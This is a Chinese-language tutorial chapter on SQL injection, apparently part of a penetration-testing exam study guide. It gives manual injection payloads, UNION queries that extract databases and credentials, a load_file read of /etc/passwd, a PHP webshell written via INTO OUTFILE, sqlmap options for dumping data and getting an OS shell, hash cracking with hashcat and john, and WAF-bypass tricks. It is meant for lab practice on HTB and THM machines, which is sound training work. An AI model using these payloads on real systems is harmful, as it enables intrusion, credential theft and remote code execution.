# Ch 11 — SQL Injection：手注 + sqlmap

> 目標：理解 SQLi 原理，能手動驗證注入點，用 sqlmap 自動化提取資料，並知道如何用 SQLi 取得 shell。

## SQL Injection 的本質

Web 應用把使用者輸入拼接進 SQL 查詢：

```php
// 有漏洞的 PHP 程式碼
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// 正常請求：id=1
SELECT * FROM users WHERE id = 1

// 攻擊者輸入：id=1 OR 1=1--
SELECT * FROM users WHERE id = 1 OR 1=1--
                                      ^^^ 這讓 WHERE 永遠為真
                                          返回所有使用者
```

`--` 是 SQL 的行內註解，後面的條件全被忽略。

## 手動測試注入點

### 確認是否有 SQLi

```
1. 輸入一個單引號：  ?id=1'
   → 有 SQL 錯誤 = 可能有注入

2. 輸入 True 條件：  ?id=1 AND 1=1--
   → 結果和正常一樣 = Boolean-based 注入

3. 輸入 False 條件： ?id=1 AND 1=2--
   → 結果消失/不同 = 確認注入

4. 時間延遲測試（Blind）：
   MySQL：  ?id=1 AND SLEEP(5)--
   MSSQL：  ?id=1; WAITFOR DELAY '0:0:5'--
   → 回應延遲 5 秒 = Time-based Blind 注入
```

### 找欄位數（UNION 注入前提）

```sql
-- 逐漸加 NULL，直到不報錯
?id=1 ORDER BY 1--   → 不報錯
?id=1 ORDER BY 2--   → 不報錯
?id=1 ORDER BY 3--   → 報錯 → 有 2 個欄位

-- 用 UNION NULL 驗證
?id=1 UNION SELECT NULL,NULL--
```

### UNION 注入提取資料

確認欄位數後，找哪些欄位顯示在頁面上：

```sql
-- 假設有 3 個欄位，找哪個欄位顯示
?id=999 UNION SELECT 'COL1','COL2','COL3'--
→ 頁面顯示了 'COL2' → 第 2 欄位可回顯

-- 提取資料庫版本
?id=999 UNION SELECT NULL,version(),NULL--

-- 提取所有資料庫名稱
?id=999 UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- 提取指定資料庫的表名
?id=999 UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='dbname'--

-- 提取欄位名
?id=999 UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- 提取帳密
?id=999 UNION SELECT NULL,concat(username,':',password),NULL FROM users--
```

### 讀取系統檔案（MySQL + FILE 權限）

```sql
?id=999 UNION SELECT NULL,load_file('/etc/passwd'),NULL--
```

### 寫入 Webshell

```sql
-- 需要知道 Web 路徑 + FILE 寫入權限
?id=999 UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL
INTO OUTFILE '/var/www/html/shell.php'--
```

成功的話，訪問 `http://target/shell.php?cmd=id` 就有 RCE。

## sqlmap 自動化

手動注入確認有 SQLi 後，用 sqlmap 提取資料更快。

### 基本用法

```bash
# 對 GET 參數
sqlmap -u "http://10.10.10.x/item.php?id=1"

# 對 POST 表單（先用 Burp 複製請求到檔案）
sqlmap -r request.txt

# 指定 cookie（需要登入的頁面）
sqlmap -u "http://10.10.10.x/profile?id=1" --cookie="PHPSESSID=abc123"
```

### 常用選項

```bash
# 列出所有資料庫
sqlmap -u "..." --dbs

# 列出指定資料庫的表
sqlmap -u "..." -D database_name --tables

# 列出欄位
sqlmap -u "..." -D database_name -T table_name --columns

# 提取資料（帳號密碼）
sqlmap -u "..." -D database_name -T users --dump

# 嘗試取得系統 shell
sqlmap -u "..." --os-shell

# 嘗試讀檔案
sqlmap -u "..." --file-read="/etc/passwd"
```

### sqlmap 速度調整

```bash
# 考試環境中，默認速度太慢時：
sqlmap -u "..." --level=3 --risk=2   # 更多 payload
sqlmap -u "..." --threads=5          # 多執行緒（謹慎）
sqlmap -u "..." --batch              # 自動選預設，不問問題
```

### 用 Burp 抓請求給 sqlmap

```bash
# 在 Burp 右鍵 → Copy to file → request.txt
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D webapp -T users --dump
```

## 取得密碼後破解

sqlmap dump 出來的密碼通常是 hash：

```bash
# 識別 hash 類型
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
# → MD5

# 用 hashcat 破解
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# -m 0 = MD5

# 用 john
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## 常見 SQLi 繞過技術

有 WAF（Web Application Firewall）時：

```sql
-- 大小寫混合
?id=1 UNiOn SeLeCt NULL,NULL--

-- 注解繞過
?id=1 UN/**/ION SEL/**/ECT NULL,NULL--

-- 空白替換
?id=1 UNION%09SELECT%09NULL,NULL--

-- 雙寫（某些過濾會把 UNION 去掉，結果變成 UNION）
?id=1 UNUNIONION SELECT NULL,NULL--
```

sqlmap 的 `--tamper` 選項有內建繞過腳本：

```bash
sqlmap -u "..." --tamper=space2comment
sqlmap -u "..." --tamper=between,randomcase
```

## 不同資料庫的差異

```sql
-- 版本
MySQL:   SELECT version()
MSSQL:   SELECT @@version
Oracle:  SELECT banner FROM v$version
PostgreSQL: SELECT version()

-- 當前使用者
MySQL:   SELECT user()
MSSQL:   SELECT SYSTEM_USER
Oracle:  SELECT USER FROM dual

-- 列表名（system tables）
MySQL:   information_schema.tables
MSSQL:   sys.tables 或 information_schema.tables
Oracle:  all_tables
PostgreSQL: information_schema.tables
```

## 本章對應靶機

| 機器 | SQLi 類型 |
|------|---------|
| HTB Nineveh | SQLi → 提取帳密 → SSH |
| HTB Valentine | Web 枚舉 → Heartbleed → 找憑證 |
| THM SQL Injection | 練習各種 SQLi 類型 |
| THM DVWA | Damn Vulnerable Web App，適合練手注 |

## 自我檢核

- [ ] 能手動確認一個 GET 參數是否有 SQLi（單引號測試）
- [ ] 能用 UNION 手動提取資料（先找欄位數）
- [ ] 能用 sqlmap `-r request.txt --dump` 提取資料
- [ ] 知道 `INTO OUTFILE` 可以寫入 webshell（前提條件）

→ [Ch 12 檔案包含（LFI/RFI）與日誌毒化](./12-lfi-rfi.md)
